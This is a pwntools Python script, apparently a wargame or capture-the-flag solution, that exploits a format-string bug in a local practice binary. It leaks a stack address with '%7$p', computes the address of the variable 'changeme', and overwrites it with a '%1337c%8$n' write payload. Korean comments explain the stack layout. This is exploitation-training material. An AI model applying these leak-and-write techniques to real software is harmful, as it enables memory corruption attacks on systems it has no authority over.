from pwn import *

p = process("./fsb_overwrite")
elf = ELF('./fsb_overwrite')
##########
# 1. get address of 'main + 112' from stack
##########
# send FSB payload
p.sendline(b"%7$p")
addr_leak = int(p.recvline()[:-1], 16)

##########
# 2. calculate address main+112 in stack
##########
# calculate address of 'main' function
addr_main = addr_leak - 112
print('addr_main:', hex(addr_main))
# calculate address of target variable 'changeme'
# 'changeme' is 11660 away from 'main'
# addr_changeme = addr_main + 11660
addr_changeme = addr_main + (elf.symbols['changeme'] - elf.symbols['main'])

print('offset main:', hex(elf.symbols['main']))
print('offset changeme:', hex(elf.symbols['changeme']))
print('addr_changeme:', hex(addr_changeme))

##########
# 3. overwrite 'changeme' variable 
##########
payload = b"%1337c%8$n".ljust(16,b'A')
payload += p64(addr_changeme)
print('payload:', payload)
# 1337 길이의 어떤 문자를 출력하고(무슨 문자가 될지는 모름)
# 1337을 rsp[0x18] 에 덮어쓰게 하기 위해 16자리까지는 FSB 유발 데이터 + dummy string 으로 채우고
# 17자리부터 24자리까지 changeme 변수의 주소로 채운다.
# 이렇게 되면 stack 에서 rsp[0] ~ rsp[16] 까지는 FSB 유발 데이터 + dummy string 이 들어가고
# rsp[17] ~ rsp[24] 까지는 changeme 변수의 주소가 담기게 된다.
p.sendline(payload)

p.interactive()

